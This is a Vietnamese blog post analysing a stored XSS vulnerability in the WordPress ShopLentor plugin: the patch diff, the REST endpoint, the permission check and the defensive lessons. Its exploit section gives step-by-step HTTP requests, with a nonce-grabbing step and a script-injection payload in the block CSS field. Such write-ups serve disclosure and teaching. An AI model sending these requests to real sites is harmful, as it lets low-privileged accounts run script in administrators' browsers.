---
title: CVE-2025-58990 Analysis & POC
description: Security Vulnerability in WordPress ShopLentor Plugin.
date: 2025-10-05 22:45:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, xss]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lỗ hổng trong plugin **ShopLentor** trước phiên bản **3.2.0** cho phép kẻ tấn công có quyền **contributor** chèn mã độc vào CSS của block. CSS này sau đó được nạp inline vào trang và có khả năng dẫn tới Stored XSS khi được preview hoặc hiển thị trong trình duyệt.

* **CVE ID**: [CVE-2025-58990](https://www.cve.org/CVERecord?id=CVE-2025-58990)
* **Product**: [WordPress ShopLentor Plugin](https://wordpress.org/plugins/woolentor-addons/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 3.2.0
* **CVSS severity**: Low (6.5)
* **Required Privilege**: Contributor

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **ShopLentor**: v3.2.0(vul) và v3.2.1(fix)
* **diff tool**: **meld** hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version
* **Actived WooCommerce plugin**: plugin bắt buộc **actived** trước khi cài **ShopLentor Plugin**

## Analysis

### Patch Diff

Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file **woolentor-blocks/includes/classes/Manage_Styles.php**.

**Bản lỗi**:

```php
public function save_block_css( $request ){
    $params 	= $request->get_params();
    $post_id = sanitize_text_field( $params['post_id'] );

    // Không kiểm tra quyền user
    // Không lọc nội dung CSS trước khi lưu
    update_post_meta( $post_id, '_woolentor_css', $params['block_css'] );
    $wp_filesystem->put_contents( $dirname . $filename, $params['block_css'] );
}
```

**Bản vá**:

```php
public function save_block_css( $request ){
    $params 	= $request->get_params();
    $post_id = sanitize_text_field( $params['post_id'] );

    // Chỉ admin hoặc tác giả bài viết mới được phép
    $post = get_post( $post_id );
    if ( ! $post || ( ! current_user_can('manage_options') &&
        get_current_user_id() !== (int) $post->post_author ) ) {
        return ['success' => false, 'message' => __('No permission')];
    }

    // Lọc dữ liệu trước khi lưu
    $block_css = $this->sanitize_css_content( $params['block_css'] );
    update_post_meta( $post_id, '_woolentor_css', $block_css );
    $wp_filesystem->put_contents( $dirname . $filename, $block_css );
}
```

Bản vá dùng `current_user_can(manage_options)` để kiểm tra có phải **admin** không

* Nếu user là **admin** => vế đầu `! current_user_can('manage_options') = false` => cả biểu thức `&& = false` => qua được.
* Nếu user là **author** => vế sau `get_current_user_id() !== (int) $post->post_author = false` => cả biểu thức `&& = false` => qua được.

{{< figure src="patch_diff.png" caption="Patch Diff" >}}

### How It Work?

```php
public function save_block_css( $request ){
    try{
        global $wp_filesystem;
        if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) {
            require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }

        $params 	= $request->get_params();
        $post_id 	= sanitize_text_field( $params['post_id'] );
        
        if ( $post_id == 'woolentor-widget' && $params['has_block'] ) {
            update_option( $post_id, $params['block_css'] );
            return [
                'success' => true, 
                'message' => __('Widget CSS Saved.', 'woolentor')
            ];
        }

        $filename 		= "woolentor-css-{$post_id}.css";
        $upload_dir_url = wp_upload_dir();
        $dirname 		= trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/';

        if ( $params['has_block'] ) {
            update_post_meta( $post_id, '_woolentor_active', 'yes' );
            $all_block_css = $params['block_css'];

            WP_Filesystem( false, $upload_dir_url['basedir'], true );
            if( ! $wp_filesystem->is_dir( $dirname ) ) {
                $wp_filesystem->mkdir( $dirname );
            }

            update_post_meta( $post_id, '_woolentor_css', $all_block_css );
            if ( ! $wp_filesystem->put_contents( $dirname . $filename, $all_block_css ) ) {
                throw new \Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); 
            }
            return [
                'success' => true,
                'message' =>__('WooLentor Blocks css file update.', 'woolentor' )
            ];
        } else {
            delete_post_meta( $post_id, '_woolentor_active' );
            if ( file_exists( $dirname.$filename ) ) {
                wp_delete_file( $dirname.$filename );
            }
            delete_post_meta( $post_id, '_woolentor_css' );
            return [
                'success' => true,
                'message' => __('WooLentor Blocks CSS Delete.', 'woolentor' )
            ];
        }
    } catch( \Exception $e ){
        return [
            'success' => false,
            'message' => $e->getMessage()
        ];
    }
}
```

Hàm `save_block_css()` thuộc class `Manage_Styles` có nhiệm vụ lưu hoặc xóa CSS tuỳ theo block.

Ứng dụng sẽ lấy `post_id` và nội dung `block_css` từ request.

**Trường hợp đặc biệt**: nếu `post_id = woolentor-widget` => lưu CSS vào `wp_options`

**Trường hợp bài viết thường**:

* Nếu có block (`has_block = true`):

  * Đánh dấu post đang active (`_woolentor_active`).
  * Lưu CSS vào bảng `wp_postmeta` với `meta_key` là `_woolentor_css`.

  ```sql
  mysql> select * from wp_postmeta where meta_key='_woolentor_css';
  +---------+---------+----------------+------------+
  | meta_id | post_id | meta_key       | meta_value |
  +---------+---------+----------------+------------+
  |      27 |      69 | _woolentor_css | body:{}    |
  |     687 |    1416 | _woolentor_css | body:{}    |
  +---------+---------+----------------+------------+
  ```

  * Ghi CSS ra file trong thư mục upload (`woolentor-css-{post_id}.css`).

  {{< figure src="write_css.png" caption="Write CSS" >}}

* Nếu không có block (`has_block = false`):

  * Xoá trạng thái active và CSS meta.
  * Xoá file CSS nếu tồn tại.

👉 Khả năng xảy ra là combo **Stored XSS** phổ biến trong plugin WordPress: user role **contributor** (không có quyền publish) tạo post có CSS chứa payload XSS. Payload này được lưu trong **database** hoặc một **file**; Người dùng có đặc quyền cao hơn sẽ preview (xem trước) nội dung trước khi publish, payload sẽ được tải/hiển thị trong trình duyệt và thực thi, gây ra XSS.

Để hiểu cách dữ liệu được hiển thị, ta tìm với từ khóa `_woolentor_css` trong thư mục plugin. Vì CSS được lưu trong `wp_postmeta` với `meta_key = _woolentor_css`, nên chắc chắn plugin sẽ truy vấn giá trị này và chèn trực tiếp vào HTML.

{{< figure src="meta_key.png" caption="Search Meta Key" >}}

`generate_inline_css()` lấy block CSS từ **wp_postmeta** với `meta_key = _woolentor_css` và lấy từ file `woolentor-css-{$post_id}.css`, nếu file tồn tại thì `get_contents` và inline CSS cho post có `$post_id` được truyền vào, còn nếu file không tồn tại thì lấy từ **wp_postmeta**.

Nội dung được đặt trong thẻ `<style type="text/css"></style>`

---

class `Manage_Styles` đăng ký **REST API** trong hàm `register_routes`

```php
public function register_routes( $namespace ){
    register_rest_route( $namespace, 'save_css',
        [
            [
                'methods'  => 'POST', 
                'callback' => [ $this, 'save_block_css' ],
                'permission_callback' => [ $this, 'permission_check' ],
                'args' => []
            ]
        ]
    );
    // other route
}
```

Hàm `register_rest_route()` tạo một **REST API** endpoint tại đường dẫn:

```
/wp-json/{namespace}/save_css
```

Khi có request **POST** tới endpoint này:

* WordPress sẽ gọi hàm `save_block_css()` để xử lý dữ liệu.
* Trước đó, `permission_callback` sẽ chạy hàm `permission_check()` để kiểm tra quyền của user (nếu trả về false thì chặn request).

```php
public function permission_check() {
    if( current_user_can( 'edit_posts' ) ){
        return true;
    }else{
        return false;
    }
}
```

Hàm `permission_check` quy định rằng chỉ những user có quyền **contributor** trở lên mới được phép sử dụng API này.

Ta chưa xác định được chính xác **namespace** ở đây là gì vì nó được khai báo ở đâu đó trong mã nguồn, không phải trong class này. Ta tận dụng route `save_css` để truy vết.

Truy cập `/wp-json/` và tìm với từ khóa `save_css`

{{< figure src="search.png" caption="Search" >}}

Kết quả cho thấy endpoint thực tế là:

```http
http://localhost/wp-json/woolentor/v1/save_css
```

Để biết **namespace** này được khai báo ở đâu, ta tiếp tục tìm trong mã nguồn với từ khóa `'woolentor/v1'`:

{{< figure src="name_space.png" caption="Name Space" >}}

Có nhiều kết quả, nhưng vì ta đang phân tích tính năng **REST API**, nên tập trung vào file **Api.php**.

`register_routes( $namespace )` thuộc class `Manage_Styles` yêu cầu tham số `$namespace` nên có thể `woolentor/v1` được truyền ở đây thông qua thể hiện của class gọi đến hàm. ta tìm với từ khóa `Manage_Styles` trong file **Api.php** để biết nó được gọi như vậy không.

{{< figure src="callapi.png" caption="Call Api" >}}

`namespace` chính xác được gọi và truyền như vậy.

👉 Như vậy, khi gửi **POST** request đến endpoint `http://localhost/wp-json/woolentor/v1/save_css`, callback `save_block_css` được gọi để thêm/sửa block CSS trong file và database.
Khi truy cập vào post có `post_id` liên quan đến block CSS được lưu, `generate_inline_css` sẽ lấy nội block CSS và inline CSS trong thẻ `<style type="text/css"></style>` của post.

## Exploit

### Detect XSS

Sử dụng user có role **contributor** tạo 1 post bất kì, ghi nhớ id của post đó.

Gửi **POST** request đến endpoint `http://localhost/wp-json/woolentor/v1/save_css` với XSS payload

```http
POST /wp-json/woolentor/v1/save_css HTTP/1.1
Host: localhost
Content-Type: application/json

{
"post_id":1416,
"has_block":true,
"block_css":"</style><script>alert(document.domain)</script><style>"
}
```

**Response**

```json
{
    "code":"rest_forbidden",
    "message":"Sorry, you are not allowed to do that.",
    "data":{
        "status":401
    }
}
```

👉 Thiếu header **X-WP-Nonce** để phân quyền người dùng. Ta mở source HTML (<kbd>Ctrl</kbd>+<kbd>U</kbd>) trang chỉnh sửa bài viết:

```
view-source:http://localhost/wp-admin/post.php?post=<post_id>&action=edit
```

Tìm `wpApiSettings` trong source và lấy giá trị `nonce`

{{< figure src="api_search.png" caption="wpApiSettings" >}}

Gửi request với **X-WP-Nonce** có giá trị vừa lấy được

```http
POST /wp-json/woolentor/v1/save_css HTTP/1.1
Host: localhost
X-WP-Nonce: f79ec79e4b
Content-Type: application/json

{
"post_id":1416,
"has_block":true,
"block_css":"</style><script>alert(document.domain)</script><style>"
}
```

**Preview post**

{{< figure src="preview.png" caption="Preview" >}}

👉 XSS thành công, **inspect** để xem code được thay đổi như nào

**View source code**

{{< figure src="code.png" caption="Code" >}}

## Conclusion

Lỗ hổng **CVE-2025-58990** trong plugin **ShopLentor <= 3.2.0** cho phép **contributor** chèn CSS độc hại dẫn đến Stored XSS khi admin/author preview hoặc xem post. Bản vá **3.2.1** bổ sung kiểm tra quyền và sanitize CSS, ngăn chặn khai thác.

**Key takeaways**:

* Luôn kết hợp **kiểm tra quyền** và **sanitize** dữ liệu khi xử lý input từ người dùng.
* Các role thấp (như **contributor**) vẫn có thể trở thành điểm tấn công nếu API không bảo vệ đúng cách.
* **Stored XSS** trong WordPress thường xuất hiện khi dữ liệu được lưu DB/file => render inline mà không lọc.
* Việc cập nhật plugin kịp thời là biện pháp phòng thủ đơn giản nhưng hiệu quả nhất.

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[ WordPress ShopLentor Plugin <= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ](https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability)
